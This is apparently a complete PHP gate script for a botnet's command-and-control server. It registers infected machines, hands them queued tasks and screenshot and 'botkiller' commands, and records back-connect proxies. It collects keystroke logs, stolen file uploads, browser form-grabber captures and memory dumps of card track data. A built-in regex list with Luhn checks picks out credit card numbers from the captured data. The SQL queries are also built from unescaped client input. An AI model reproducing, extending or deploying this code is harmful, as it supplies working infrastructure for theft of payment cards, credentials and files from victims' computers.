<?php
define('N3N', 1);

if (!ini_get('date.timezone')) {
    date_default_timezone_set('GMT');
}

include __DIR__ . '/config.php';
include __DIR__ . '/functions.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    NotFound();
}

include __DIR__ . '/IP2Location/IP2Location.php';
include __DIR__ . '/IP2Location/countries.php';
include __DIR__ . '/IP2Location/code2name.php';

$mysqli = ConnectMySQLi($db_host, $db_login, $db_password, $db_database);
$settings_array = GetConfig(SETTINGS_FILE);

$client_ip = GetRealIP();
$client_time = time();
$client_date = date('Y-m-d H:i:s');
$client_command = null;

$enc_arr = isset($_POST['_wv']) ? $_POST['_wv'] : '';
$arr_cmd = explode('&', base64_decode($enc_arr));

$client_id = md5(isset($arr_cmd[1]) ? $arr_cmd[1] : 'FAIL');
$client_name = (isset($arr_cmd[2]) ? $arr_cmd[2] : 'FAIL');
$client_build_id = (isset($arr_cmd[8]) ? $arr_cmd[8] : 'NONE');
$client_country = 'O1';

if ((bool)$settings_array['ban_enabled']) {
    $is_banned = $mysqli->query('SELECT * FROM ' . DB_BAN . ' WHERE client_id_ip = "' . $client_id . '" OR client_id_ip = "' . $client_ip . '"')->num_rows;
    if ((bool)$is_banned) {
        $mysqli->close();
        NotFound();
    } else {
        $cookie_auth = isset($_COOKIE[CONN_COOKIES_NAME]) ? $_COOKIE[CONN_COOKIES_NAME] : 0;
        if ($cookie_auth != CONN_COOKIES_VALUE) {
            $mysqli->close();
            NotFound();
        }
    }
}

if (strcasecmp($arr_cmd[0], 'cmd') == 0) {

    $client_os = (isset($arr_cmd[3]) ? $mysqli->real_escape_string($arr_cmd[3]) : 'FAIL');
    $client_priv = (isset($arr_cmd[4]) ? (int)$arr_cmd[4] : 0);
    $client_av = (isset($arr_cmd[5]) ? $mysqli->real_escape_string($arr_cmd[5]) : 'FAIL');
    $client_version = (isset($arr_cmd[6]) ? $mysqli->real_escape_string($arr_cmd[6]) : 'FAIL');
    $client_lifetime = (isset($arr_cmd[7]) ? $mysqli->real_escape_string($arr_cmd[7]) : 'FAIL');

    if ((bool)$settings_array['geo_enabled']) {

        $geo_db = new \IP2Location\Database('./IP2Location/IP-COUNTRY.BIN', \IP2Location\Database::FILE_IO);
        $client_country = $geo_db->lookup($client_ip, \IP2Location\Database::COUNTRY_CODE);

        if (strlen($client_country) < 2) {
            $client_country = 'O1';
        }
    }

    $client_comment = $mysqli->query('SELECT client_comment FROM ' . DB_CLIENTS . ' WHERE client_id = "' . $client_id . '"')->fetch_object()->client_comment;
    $mysqli->query('REPLACE INTO ' . DB_CLIENTS . ' (client_id, client_ip, client_country, client_os, client_priv, client_name, client_version, client_av, client_date, client_time, client_build_id, client_life_time, client_comment)
    VALUES ("' . $client_id . '", "' . $client_ip . '", "' . $client_country . '", "' . $client_os . '", "' . $client_priv . '", "' . $client_name . '", "' . $client_version . '", "' . $client_av . '", "' . $client_date . '", "' . $client_time . '", "' . $client_build_id . '", "' . $client_lifetime . '", "' . $client_comment . '")');

    $client_command = $settings_array['knock_rate_id'] . '#rate ' . $settings_array['knock_rate'] . '#';
    if ((bool)$settings_array['screenshot_enabled']) {
        $client_command .= '1463020066516169#screenshot#';
    }

    if ((bool)$settings_array['botkiller_enabled']) {
        $client_command .= '1469100096882000#botkiller#';
    }

    $res = $mysqli->query('SELECT * FROM ' . DB_TASKS . ' WHERE task_status = 1');
    if ($res) {
        while ($row = $res->fetch_assoc()) {

            $task_id = $row['task_id'];
            $task_need_execs = $row['task_need_execs'];
            $task_given_count = $row['task_given_execs'];

            if ($task_need_execs != 0) {
                $mysqli->query('UPDATE ' . DB_TASKS . ' SET task_given_execs = task_given_execs+1 WHERE task_id = "' . $task_id . '"');
            }
            if ($task_need_execs != 0 && $task_need_execs == $task_given_count) {
                $mysqli->query("UPDATE " . DB_TASKS . " SET task_status='0' WHERE task_id = '" . $task_id . "'");
            } else {

                $task_by_clients = $row['task_by_clients'];
                $task_by_build_id = !empty($row['task_by_build_id']) ? $row['task_by_build_id'] : 'ALL';

                if ($task_by_build_id == $client_build_id || $task_by_build_id == 'ALL') {
                    if (strlen($task_by_clients) == 2 && $task_by_clients == $client_country) {
                        $client_command .= $row['task_id'] . $row['task_pref'] . $row['task_command'] . $row['task_postf'];
                    }
                    if (strlen($task_by_clients) == 35 && $task_by_clients == "ID:$client_id") {
                        $client_command .= $row['task_id'] . $row['task_pref'] . $row['task_command'] . $row['task_postf'];
                    }
                    if (strlen($task_by_clients) == 3) { // All
                        $client_command .= $row['task_id'] . $row['task_pref'] . $row['task_command'] . $row['task_postf'];
                    }
                }
            }
        }
    }
}
if (strcasecmp($arr_cmd[0], 'log') == 0) {

    $event_type = null;
    $temp = $mysqli->real_escape_string($arr_cmd[3]);
    $event_text = $mysqli->real_escape_string($arr_cmd[4]);

    switch ($temp) {
        case 'p':
            $event_type = 'Found process ';
            break;
        case 'd':
            $event_type = 'Debug ';
            break;
        case 'c':
            $event_type = 'Cmd ';
            break;
    }

    $event_hash = md5($client_id . $event_text . $event_type);
    $mysqli->query('REPLACE INTO ' . DB_LOGS . ' (client_id, client_ip, client_event_name, client_event_text, client_event_date, client_event_time, client_event_hash)
			       VALUES ("' . $client_id . '", "' . $client_ip . '", "' . $event_type . '", "' . $event_text . '", "' . $client_date . '", "' . $client_time . '", "' . $event_hash . '")');

}
if (strcasecmp($arr_cmd[0], 'plugin') == 0) {
    $plugin_name = $mysqli->real_escape_string($arr_cmd[3]);
    $plugin_data = $mysqli->real_escape_string($arr_cmd[4]);
    $plugin_hash = md5($client_id . $plugin_name . $plugin_data);

    $mysqli->query('REPLACE INTO ' . DB_PLUGIN . ' (client_id, client_ip, client_event_name, client_event_text, client_event_date, client_event_time, client_event_hash)
			       VALUES ("' . $client_id . '", "' . $client_ip . '", "' . $plugin_name . '", "' . $plugin_data . '", "' . $client_date . '", "' . $client_time . '", "' . $plugin_hash . '")');
}
if (strcasecmp($arr_cmd[0], 'proxy') == 0) {

    $end_point_ip = $mysqli->real_escape_string($arr_cmd[4]);
    if (filter_var($end_point_ip, FILTER_VALIDATE_IP)) {

        $end_point_uid = $mysqli->query('SELECT client_id FROM ' . DB_CLIENTS . ' WHERE client_ip = "' . $end_point_ip . '"')->fetch_object()->client_id;
        $end_point_country = $mysqli->query('SELECT client_country FROM ' . DB_CLIENTS . ' WHERE client_id = "' . $end_point_uid . '"')->fetch_object()->client_country;

        if (!empty($end_point_uid)) {
            $bc_server = $client_ip;
            $bc_server_port = $mysqli->real_escape_string($arr_cmd[3]);
            $bc_hash = md5($end_point_uid . $bc_server . $bc_server_port);

            $mysqli->query('REPLACE INTO ' . DB_PROXY . ' (client_id, client_ip, client_bc_ip, client_bc_port, client_date, client_time, client_country, client_hash)
			       VALUES ("' . $end_point_uid . '", "' . $end_point_ip . '", "' . $bc_server . '", "' . $bc_server_port . '", "' . $client_date . '", "' . $client_time . '" , "' . $end_point_country . '", "' . $bc_hash . '")');

        }
    }
}
if (strcasecmp($arr_cmd[0], 'fail') == 0) {
    $task_id = $mysqli->real_escape_string($arr_cmd[1]);
    $mysqli->query('UPDATE ' . DB_TASKS . ' SET task_failed_execs = task_failed_execs+1 WHERE task_id = "' . $task_id . '"');
}
if (strcasecmp($arr_cmd[0], 'exec') == 0) {
    $task_id = $mysqli->real_escape_string($arr_cmd[1]);
    $mysqli->query('UPDATE ' . DB_TASKS . ' SET task_execs = task_execs+1 WHERE task_id = "' . $task_id . '"');
}
if (count($_FILES) > 0) {

    $client_id = md5(isset($_COOKIE['uid']) ? $_COOKIE['uid'] : 'FAIL');
    $is_exist = (int)fast_count_sql($mysqli, 'SELECT COUNT(*) FROM ' . DB_CLIENTS . ' WHERE client_id = "' . $client_id . '"');
    if ($is_exist) {
        $file_name = ($_FILES['data']['name']);
        $file_size = $_FILES['data']['size'];
        $hash_file = md5_file($_FILES['data']['tmp_name']);

        chdir('files');
        if (move_uploaded_file($_FILES['data']['tmp_name'], $hash_file)) {
            chmod($hash_file, 0644);
            $mysqli->query('REPLACE INTO ' . DB_FILES . ' (client_id, client_ip, client_file_path, client_file_size, client_file_data, client_file_hash)
        VALUES ("' . $client_id . '", "' . $client_ip . '", "' . $file_name . '", "' . $file_size . '", "' . $client_date . '", "' . $hash_file . '")');
        }
    }
}
if (strcasecmp($arr_cmd[0], 'ff') == 0) {

    $is_ssl_grabber_active = (bool)$settings_array['grabber_secure'] ? true : false;
    $is_plain_grabber_active = (bool)$settings_array['grabber_plain'] ? true : false;

    $client_host = $arr_cmd[3];
    $client_host_proto = strstr(base64_decode($client_host), 'https') ? 'ssl' : 'plain';

    if (($is_ssl_grabber_active && $client_host_proto == 'ssl') || ($is_plain_grabber_active && $client_host_proto == 'plain')) {
        if (!isGrabberBlacklist($settings_array['grabber_blacklist'], $client_host) && isGrabberWhitelist($settings_array['grabber_whitelist'], $client_host)) {

            $client_browser = $arr_cmd[5];
            switch ($client_browser) {
                case 1:
                    $client_browser = 'iexplorer';
                    break;
                case 2:
                    $client_browser = 'firefox';
                    break;
                case 3:
                    $client_browser = 'chrome';
                    break;
                case 4:
                    $client_browser = 'mail';
                    break;
                default:
                    $client_browser = 'iexplorer';
                    break;
            }

            $client_form_data = $arr_cmd[4];
            $client_form_extra = 'NONE';

            if ((bool)$settings_array['grabber_parse_extra']) {

                $extra_data_regex_array = array
                (
                    "Track 1" => '((%?[Bb]?)[0-9]{13,19}\^[A-Za-z\s]{0,26}\/[A-Za-z\s]{0,26}\^(1[2-9]|2[0-9])(0[1-9]|1[0-2])[0-9\s]{3,50})',
                    "Track 2" => '([0-9]{13,19}=(1[2-9]|2[0-9])(0[1-9]|1[0-2])[0-9]{3,50})',
                    "Visa" => '(4[0-9]{12}(?:[0-9]{3}))',
                    "MasterCard" => '(5[1-5][0-9]{14})',
                    "Visa MasterCard" => '(4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})',
                    "Amex" => '(3[47][0-9]{13})',
                    "Maestro" => '((?:5020|5038|6304|6579|6761)\d{12}(?:\d\d)?)',
                    "BCGlobal" => '((6541|6556)[0-9]{12})',
                    "Carte Blanche Card" => '(389[0-9]{11})',
                    "Diners Club Card" => '(3(?:0[0-5]|[68][0-9])[0-9]{11})',
                    "Discover Card" => '(65[4-9][0-9]{13}|64[4-9][0-9]{13}|6011[0-9]{12}|(622(?:12[6-9]|1[3-9][0-9]|[2-8][0-9][0-9]|9[01][0-9]|92[0-5])[0-9]{10}))',
                    "Insta Payment Card" => '(63[7-9][0-9]{13})',
                    "JCB Card" => '((?:2131|1800|35\d{3})\d{11})',
                    "KoreanLocalCard" => '(9[0-9]{15})',
                    "Laser Card" => '((6304|6706|6709|6771)[0-9]{12,15})',
                    "Solo Card" => '((6334|6767)[0-9]{12}|(6334|6767)[0-9]{14}|(6334|6767)[0-9]{15})',
                    "Switch Card" => '((4903|4905|4911|4936|6333|6759)[0-9]{12}|(4903|4905|4911|4936|6333|6759)[0-9]{14}|(4903|4905|4911|4936|6333|6759)[0-9]{15}|564182[0-9]{10}|564182[0-9]{12}|564182[0-9]{13}|633110[0-9]{10}|633110[0-9]{12}|633110[0-9]{13})',
                    "Union Pay Card" => '(62[0-9]{14,17})'
                );

                $extra_data_matches = array();
                $client_form_decoded = strip_tags(urldecode(base64_decode($client_form_data)));

                while ($extra_data_regex = current($extra_data_regex_array)) {
                    if (preg_match($extra_data_regex, $client_form_decoded, $extra_data_matches)) {
                        if (LuhnCheck($extra_data_matches[0])) {
                            $client_form_extra = key($extra_data_regex_array);
                            break;
                        }
                    }
                    next($extra_data_regex_array);
                }
            }

            $client_form_hash = md5($client_form_data);
            $mysqli->query('REPLACE INTO ' . DB_GRABBER . ' (client_id, client_ip, client_host, client_form, client_form_extra, client_form_hash, client_browser, client_date, client_time)
			       VALUES ("' . $client_id . '", "' . $client_ip . '", "' . $client_host . '", "' . $client_form_data . '", "' . $client_form_extra . '", "' . $client_form_hash . '", "' . $client_browser . '", "' . $client_date . '", "' . $client_time . '" )');
        }
    }
}
if (strcasecmp($arr_cmd[0], 'd') == 0) {

    $track_type = $mysqli->real_escape_string($arr_cmd[3]);
    $track_data = base64_encode($arr_cmd[4]);
    $track_hash = md5($track_data);
    $process_name = urlencode($mysqli->real_escape_string($arr_cmd[5]));

    $mysqli->query('REPLACE INTO ' . DB_DUMPS . ' (client_id, client_ip, client_data_type, client_data, client_process_name, client_date, client_time, client_data_hash)
			       VALUES ("' . $client_id . '", "' . $client_ip . '", "' . $track_type . '", "' . $track_data . '", "' . $process_name . '", "' . $client_date . '", "' . $client_time . '", "' . $track_hash . '")');
}
if (strcasecmp($arr_cmd[0], 'enter') == 0) {
    $client_command = 'success';
}
$mysqli->close();
NotFound($client_command);